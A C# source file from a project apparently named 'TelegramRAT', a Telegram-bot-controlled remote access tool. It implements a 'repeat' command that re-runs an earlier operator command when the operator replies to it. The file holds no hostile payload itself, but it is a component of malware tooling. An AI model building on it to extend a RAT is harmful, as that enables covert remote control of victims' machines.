using Telegram.Bot;
using TelegramRAT.Services;

namespace TelegramRAT.Commands.Misc;

public class RepeatCommand(ITelegramBotClient botClient, IEnumerable<IBotCommand> commands) : AbstractBotCommand
{
    public override string Command => "repeat";
    public override string[] Aliases => new[] { "rr", "rpt" };
    public override string Description => "Repeat command by replying to a message";
    public override int ArgsCount => 0;

    public override async Task ExecuteAsync(BotCommandModel model)
    {
        if (model.Message == null) return;

        if (model.Message.ReplyToMessage == null)
        {
            await botClient.SendMessage(model.Message.Chat.Id, "Reply to message", replyParameters: new Telegram.Bot.Types.ReplyParameters { MessageId = model.Message.MessageId });
            return;
        }

        BotCommandModel? replyMessageModel = BotCommandModel.FromMessage(model.Message.ReplyToMessage, string.Empty);
        if (replyMessageModel == null)
        {
            await botClient.SendMessage(model.Message.Chat.Id, "Unable to repeat command from this message");
            return;
        }

        var cmd = commands.FirstOrDefault(c => c.Command.Equals(replyMessageModel.Command, StringComparison.OrdinalIgnoreCase) ||
                                              (c.Aliases?.Contains(replyMessageModel.Command, StringComparer.OrdinalIgnoreCase) == true));

        if (cmd == null)
        {
            await botClient.SendMessage(model.Message.Chat.Id, "This message does not contain a recognized command");
            return;
        }

        if (cmd.Validate(replyMessageModel))
        {
            await cmd.ExecuteAsync(replyMessageModel);
        }
        else
        {
            await botClient.SendMessage(model.Message.Chat.Id, "Unable to repeat command from this message (validation failed)");
        }
    }
}
